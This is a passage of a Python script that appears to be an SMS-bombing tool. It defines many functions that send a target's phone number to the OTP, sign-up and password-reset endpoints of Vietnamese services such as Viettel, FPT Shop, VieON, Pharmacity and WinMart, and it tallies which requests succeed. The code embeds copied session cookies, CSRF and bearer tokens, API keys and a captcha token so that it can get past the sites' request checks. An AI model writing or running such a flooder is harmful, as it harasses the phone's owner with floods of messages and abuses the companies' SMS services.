    cookies = {'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF','__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1','XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',}
    headers = {'Accept': 'application/json, text/plain, */*','Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Type': 'application/json;charset=UTF-8','DNT': '1','Origin': 'https://viettel.vn','Referer': 'https://viettel.vn/dang-nhap','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i','X-Requested-With': 'XMLHttpRequest','X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=','sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
    json_data = {'phone': phone,'type': '',}
    response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)
    if '200' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 11
def sms11(phone):
    global thanhcong
    global thatbai
    pw=random_string(10)
    headers = {
        'authority': 'products.popsww.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'api-key': '5d2300c2c69d24a09cf5b09b',
        'content-type': 'application/json',
        'dnt': '1',
        'lang': 'vi',
        'origin': 'https://pops.vn',
        'platform': 'web',
        'profileid': '64d9292f8ec29a004edef71e',
        'referer': 'https://pops.vn/auth/signin-signup/signup',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'sub-api-version': '1.1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-env': 'production',
    }

    json_data = {
        'fullName': '',
        'account': phone,
        'password': '@rTeGS3M3huh',
        'confirmPassword': '@rTeGS3M3huh',
        'recaptcha': '03ADUVZwDaWl7VZj8I30RgFnIJlhG9BH9Xz5G5eSIffnYUlqSTy-uP-BcG61Um9hDPnjjpkVBlJM727PIOkBO-qsOof5uoeV_590TM3tpJ3wpqmBi1ey_mfjoLNFwqPJp65_S291zjLM4xjmB_GSlPTw2q8iZThXTVW8fuoEBaA1KCq3X0YF4UfWz8euxlFAL5xR-GzKdKKnvharcw8sDDy87rd1WvhLVqjZylMxkhn1E-pF3dXJq2AH0WTH7ufO7K14jy6BQmms-K2ngtVVfU7YRSmSvpTg-SLrjSRZ1eX4tV9e13n0KyFzCYyC1_il6RY_2txHYmd-HHGN9yFE8DBqaAP4XFT6hGlC7iGa0yfq2cY5XwgsnxzE-MQ3FGaXlePfGy2zgKn4XD2JJjQ3T0JQ0iusF05U65abwDAf6g_aOPRT2CXQfn8A2Fyr8Qy9GGpOfxNCAdqQrKV4dBGEeKk_Jy8ATiI3YiUTJWgALJtCSIkKS8xlKxYvcltwQMRvdLIjEfkxTP2oGT-msXLbRCZt81kFq8rdZEyEy45F6Xd704Xw-w8WEo828Z2Hl1HZpiQ9KvEgiIWhjumtnT3GFzgD2d9KtxuPPzW_tmCoqRDvg5s8BNInzd9AzwyNKxX_WM47cVcdBDxArStgyuMyi7wxKOKjV0XEvSVTzq8nrbi-rfuzusGymWEsWMaLEJ9G1dBCd9SARLyn7nZ1F4goWnuYFYSbuqrJcR6iO9OKuhJMZxw_wTRBMIloDTRfcAscZ_qiGQAkVvwxlXALegGG2_2cBbUJwq7co9-OunSY62MFNkmuY1D0dMfkUeh1-8LHPCtPPivSnhT_B-3cdc1BLLdxYKxp6MPS4-D8ttK6O0NZBV_ULuvNJBLiSyABfKolwa2K4c3sKaqDY1HX7YpV1H0XbMKRbCeizMrLqUX4hKzNrNPhZdjZK2YgU6eQVlbvRcdv6IrQV7RA5G0Md7_b-LwyyfSULFZy_eqmGLR22w9L_2SFWF8Cv8KCuPC5XKpNEqm3m7KS14oA4Kj69xDedFimjGNsup544p-9PtfQAM8XxRGrEwY7UeF376k-BzUEJGsIt9qd84LFTnOCSiSS-SDfe9zB372qm1y2oeBlVKUx0O8xGNXZgGneC2iAt2AB5XlFFN41yu_o-Pg5yKkphOKWsqhMgm10v00XwOAa6jzg31NdTKzWzCkCsIgHpUWzabHIzADOHyLUZ2G60i8asg4WMlo0VVJDfEMlxwTvfBVb4klvZg14PPuA9_w6b1meSlg4U2lXB1tn9sdcJuskZnVZCSOThzb_78UorHqIS8DfTI3KDkHswA-6LJyiqZktGDIqRHeIw8mL-VM-gFZsf095RU9tDH3-S8YntxIP2ILwq_uU0DVgiRL8UWAy798hdUTIJd9mL_gXf956MM7RUxOvTMRMycqONVQWqcLkVj28nn912CqTUV43R65WEnW-5GPgSgYUU3OChuPnsqYKI76anDkox8nUiMupSgFm5ogWBtD_4XAkRcXy8',
    }

    response = requests.post('https://products.popsww.com/api/v5/auths/register', headers=headers, json=json_data)
    if '"status":"PENDING"'in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 14
def sms14(phone):
    global thanhcong
    global thatbai
    response = requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone})
    if response.status_code == 200:
        thanhcong+=1
    else:
        thatbai+=1
#sms 15
def sms15(phone):
    global thanhcong
    global thatbai
    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)
    if response.status_code == 200:
        thanhcong+=1
    else:
        thatbai+=1
#sms 16
def sms16(phone):
    global thanhcong
    global thatbai
    cookies = {
        'PHPSESSID': 'g01c762pvq5ar9nr7jvvgi17e2',
        '6f1eb01ca7fb61e4f6882c1dc816f22d': 'T%2FEqzjRRd5g%3D4ApySdB69bY%3DcCNKJwsa%2Fcw%3Dqre4Tmq08EA%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3DLq702EXNgm8%3Dx8bGv6Sq%2FlU%3D',
        '__utma': '65249340.749882294.1693621896.1693621896.1693621896.1',
        '__utmc': '65249340',
        '__utmz': '65249340.1693621896.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)',
        '__utmt': '1',
        '_gcl_au': '1.1.2047908794.1693621896',
        '_ga': 'GA1.1.1208443557.1693621896',
        '_tt_enable_cookie': '1',
        '_ttp': 'e_rkx4EMJ3cyvbsX7bgNRXuARlC',
        'Srv': 'cc204|ZPKeo|ZPKej',
        '_ga_DFG3FWNPBM': 'GS1.1.1693621896.1.1.1693621915.41.0.0',
        '__utmb': '65249340.3.10.1693621896',
        '_ga_BBD6001M29': 'GS1.1.1693621900.1.1.1693621916.44.0.0',
    }

    headers = {
        'authority': 'concung.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=g01c762pvq5ar9nr7jvvgi17e2; 6f1eb01ca7fb61e4f6882c1dc816f22d=T%2FEqzjRRd5g%3D4ApySdB69bY%3DcCNKJwsa%2Fcw%3Dqre4Tmq08EA%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3DLq702EXNgm8%3Dx8bGv6Sq%2FlU%3D; __utma=65249340.749882294.1693621896.1693621896.1693621896.1; __utmc=65249340; __utmz=65249340.1693621896.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; _gcl_au=1.1.2047908794.1693621896; _ga=GA1.1.1208443557.1693621896; _tt_enable_cookie=1; _ttp=e_rkx4EMJ3cyvbsX7bgNRXuARlC; Srv=cc204|ZPKeo|ZPKej; _ga_DFG3FWNPBM=GS1.1.1693621896.1.1.1693621915.41.0.0; __utmb=65249340.3.10.1693621896; _ga_BBD6001M29=GS1.1.1693621900.1.1.1693621916.44.0.0',
        'dnt': '1',
        'origin': 'https://concung.com',
        'referer': 'https://concung.com/dang-nhap.html',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'ajax': '1',
        'classAjax': 'AjaxLogin',
        'methodAjax': 'sendOtpLogin',
        'customer_phone': phone,
        'id_customer': '0',
        'static_token': 'e633865a31fa27f35b8499e1a75b0a76',
        'momoapp': '0',
        'back': 'khach-hang.html',
    }

    response = requests.post('https://concung.com/ajax.html', cookies=cookies, headers=headers, data=data)
    if response.status_code == 200:
        thanhcong+=1
    else:
        thatbai+=1

#sms 19
def sms19(phone):
    global thanhcong
    global thatbai
    headers = {
        'authority': 'api-crownx.winmart.vn',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'authorization': 'Bearer undefined',
        'dnt': '1',
        'origin': 'https://winmart.vn',
        'referer': 'https://winmart.vn/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'phoneNo': phone,
    }

    response = requests.get('https://api-crownx.winmart.vn/as/api/web/v1/send-otp', params=params, headers=headers)
    if response.status_code == 200:
        thanhcong+=1
    else:
        thatbai+=1
#sms 20
def sms20(phone):
    global thanhcong
    global thatbai
    response = requests.post("https://api.vayvnd.vn/v1/users/password-reset", headers={"Host": "api.vayvnd.vn","content-length": "22","accept": "application/json","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://vayvnd.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vayvnd.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"login": phone}))
    if response.status_code == 200:
        thanhcong+=1
    else:
        thatbai+=1

#sms 24
def sms24(phone):
    global thanhcong
    cookies = {
        '_ga': 'GA1.1.2087670331.1693621115',
        'ajs_anonymous_id': 'f03d6d9e-8b96-4989-85e4-4a2f1aa5804d',
        'ApplicationGatewayAffinityCORS': 'e3a3e7f76978c3189d076edb90ce010d',
        'ApplicationGatewayAffinity': 'e3a3e7f76978c3189d076edb90ce010d',
        '_ga_05MHVHMYGR': 'GS1.1.1693621114.1.1.1693621123.0.0.0',
    }

    headers = {
        'authority': 'topenland.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        # 'cookie': '_ga=GA1.1.2087670331.1693621115; ajs_anonymous_id=f03d6d9e-8b96-4989-85e4-4a2f1aa5804d; ApplicationGatewayAffinityCORS=e3a3e7f76978c3189d076edb90ce010d; ApplicationGatewayAffinity=e3a3e7f76978c3189d076edb90ce010d; _ga_05MHVHMYGR=GS1.1.1693621114.1.1.1693621123.0.0.0',
        'dnt': '1',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'phoneNumber': phone,
    }

    response = requests.get(
        'https://topenland.com/_next/data/VL6b140TPQ9AMHJ2DqgBU/vi/sign-up/verify-otp.json',
        params=params,
        cookies=cookies,
        headers=headers,
    )

    thanhcong+=1
#sms 25
def sms25(phone):
    global thanhcong
    global thatbai
    headers = {'authority': 'api-gateway.pharmacity.vn','accept': '*/*','accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','content-type': 'application/json','dnt': '1','origin': 'https://www.pharmacity.vn','referer': 'https://www.pharmacity.vn/','sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',}
    json_data = {'phone': phone,'referral': '',}
    response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, json=json_data)
    if 'success' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 26
def sms26(phone):
    global thanhcong
    global thatbai
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'DNT': '1',
        'Origin': 'https://video.mocha.com.vn',
        'Referer': 'https://video.mocha.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'msisdn': phone,
        'languageCode': 'vi',
    }

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
    if '200' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#Note------------------------------------------------------------------
#End note----------------------------------------------------------------------------
#sms 29
def sms29(phone):
    global thanhcong
    global thatbai
    headers = {'Host': 'moca.vn','Accept': '*/*','Device-Token': '20212544654','X-Requested-With': 'XMLHttpRequest','Accept-Language': 'vi','X-Moca-Api-Version': '2','platform': 'P_IOS-2.10.42','User-Agent': 'Pass/2.10.42 (iPhone; iOS 13.3; Scale/2.00)',}
    params = {'phoneNumber': phone,}
    try:
        home = requests.get('https://moca.vn/moca/v2/users/role', params=params, headers=headers).json()
        token = home['data']['registrationId']
        response = requests.post(f'https://moca.vn/moca/v2/users/registrations/{token}/verification', headers=headers).json()
        thanhcong+=1
    except:
        thatbai+=1
#sms 31
def sms31(phone):
    global thanhcong
    global thatbai
    headers = {'Accept': 'application/json, text/plain, */*','Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Type': 'application/json;charset=UTF-8','DNT': '1','Origin': 'https://id-v121.medpro.com.vn','Referer': 'https://id-v121.medpro.com.vn/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36','appid': 'medpro','cskhtoken': '','locale': '','momoid': '','osid': '','ostoken': '','partnerid': 'medpro','platform': 'pc','sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
    json_data = {'fullname': 'người dùng medpro','deviceId': '1a27c3f208891176783815134edea038','phone': phone,'type': 'password',}
    response = requests.post('https://api-v2.medpro.com.vn/user/phone-register', headers=headers, json=json_data)
    if '"status":true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 32
def sms32(phone):
    global thanhcong
    global thatbai
    headers = {
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        'DNT': '1',
        'Origin': 'https://best-inc.vn',
        'Referer': 'https://best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }

    json_data = {
        'phoneNumber': phone,
        'verificationCodeType': 1,
    }

    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
    if '"status":true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 33
def sms33(phone):
    global thanhcong
    global thatbai
    mk='545as4dasdasw34@@#E'
    cookies = {
        '_gcl_au': '1.1.741379393.1691157935',
        '__zi': '3000.SSZzejyD5z0dY_oedHWSrs7TjUc5LXBF8e6duvf4KDqqbAYzaqKPaJ6MhRMK3HcVEDEkjvu779mpDp0.1',
    }

    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': '_gcl_au=1.1.741379393.1691157935; __zi=3000.SSZzejyD5z0dY_oedHWSrs7TjUc5LXBF8e6duvf4KDqqbAYzaqKPaJ6MhRMK3HcVEDEkjvu779mpDp0.1',
        'DNT': '1',
        'Origin': 'https://onland.tech',
        'Referer': 'https://onland.tech/user/register.html',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone_number': phone,
        'password': 'BE@Rh9zkuHsmTn',
        'fullname': 'nguyen thi an',
        'email': 'jhasdhahj@gmail.com',
        'province': '77',
        'broker': '',
    }

    response = requests.post('https://onland.tech/api/register', cookies=cookies, headers=headers, json=json_data)
    if '200' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 34
def sms34(phone):
    global thanhcong
    global thatbai
    headers = {'authority': 'v3.meeyid.com','accept': '*/*','accept-language': 'vi-VN','content-type': 'application/json','dnt': '1','origin': 'https://meeyland.com','referer': 'https://meeyland.com/','sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36','x-affilate-id': 'www.google.com','x-browser-id': 'undefined','x-client-id': 'meeyland','x-partner-id': '',}
    json_data = {'phone': phone,'phoneCode': '+84','refCode': '',}
    response = requests.post('https://v3.meeyid.com/auth/v4.1/register-with-phone', headers=headers, json=json_data)
    if '"status":true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 35
def sms35(phone):
    global thanhcong
    global thatbai
    headers = {
        'authority': 'api.onelife.vn',
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://kingfoodmart.com',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    json_data = {
        'operationName': 'SendOTP',
        'variables': {
            'phone': phone,
        },
        'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
    if 'INVALID' in response.text:
        thatbai+=1
    else:
        thanhcong+=1


#sms 42
def sms42(phone):
    global thanhcong
    cookies = {
        '_gcl_au': '1.1.502834216.1693619185',
        '_ga': 'GA1.1.848297431.1693619186',
        '_ga_GFJFDNFKH2': 'GS1.1.1693619185.1.1.1693619198.0.0.0',
    }

    headers = {
        'authority': 'api.popeyes.vn',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json',
        # 'cookie': '_gcl_au=1.1.502834216.1693619185; _ga=GA1.1.848297431.1693619186; _ga_GFJFDNFKH2=GS1.1.1693619185.1.1.1693619198.0.0.0',
        'dnt': '1',
        'origin': 'https://popeyes.vn',
        'referer': 'https://popeyes.vn/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-client': 'WebApp',
    }

    json_data = {
        'phone': '0357497741',
        'firstName': 'hú',
        'lastName': 'alo',
        'email': 'alohu@gmail.com',
        'password': 'S9d64LUTRqziu@A',
    }

    response = requests.post('https://api.popeyes.vn/api/v1/register', cookies=cookies, headers=headers, json=json_data)
    thanhcong+=1
#sms 43
def sms43(phone):
    global thanhcong
    headers = {
        'authority': 'api.alfrescos.com.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'brandcode': 'ALFRESCOS',
        'content-type': 'application/json',
        'devicecode': 'web',
        'dnt': '1',
        'origin': 'https://alfrescos.com.vn',
        'referer': 'https://alfrescos.com.vn/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'culture': 'vi-VN',
    }

    json_data = {
        'phoneNumber': phone,
        'secureHash': '46d93c08857a9814336963a28b4efac5',
        'deviceId': '',
        'sendTime': 1693618874545,
